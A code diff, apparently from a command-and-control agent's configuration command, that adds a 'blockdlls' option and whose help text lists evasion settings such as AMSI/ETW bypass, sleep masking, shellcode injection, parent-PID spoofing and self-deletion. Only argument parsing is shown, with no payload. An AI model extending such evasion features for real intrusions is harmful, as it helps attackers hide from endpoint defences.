@@ -97,7 +97,16 @@ class ConfigArguments(TaskArguments):
             CommandParameter(
                 name="ppid",
                 type=ParameterType.Number,
-                description="Set parent process ID (positive integer)",
+                description="Set parent process ID",
+                parameter_group_info=[ParameterGroupInfo(
+                    required=False,
+                    group_name="Default"
+                )]
+            ),
+            CommandParameter(
+                name="blockdlls",
+                type=ParameterType.Number,
+                description="Set process creation to block non-microsoft dlls load",
                 parameter_group_info=[ParameterGroupInfo(
                     required=False,
                     group_name="Default"
@@ -116,7 +125,6 @@ class ConfigArguments(TaskArguments):
             except Exception as e:
                 raise ValueError(f"Invalid JSON input: {str(e)}")
         
-        # Try to parse as dictionary first
         try:
             cmd_line = self.command_line.strip().strip('"').strip("'")
             if cmd_line.startswith("{") and cmd_line.endswith("}"):
@@ -126,7 +134,6 @@ class ConfigArguments(TaskArguments):
         except json.JSONDecodeError:
             pass
         
-        # Process command line arguments
         parts = re.findall(r'(-[a-zA-Z\-]+)\s+([^-]+)(?=\s+-|$)', self.command_line.strip())
         if not parts:
             raise ValueError("Invalid command format. Use '-option value' pairs.")
@@ -165,7 +172,7 @@ class ConfigCommand( CommandBase ):
     Configure agent settings. Options can be combined:
     
     config -mask [timer|none] -bypass [all|amsi|etw] -injection-sc [classic] -sleep [seconds] -bof-hook [true|false]
-           -jitter [percentage] -killdate [YYYY-MM-DD] -ppid [pid] -exit [thread|process] -self-delete [true|false]
+           -jitter [percentage] -killdate [YYYY-MM-DD] -ppid [pid] -exit [thread|process] -self-delete [true|false] -blockdll [true|false]
     
     Examples:
         config -mask timer -bypass all
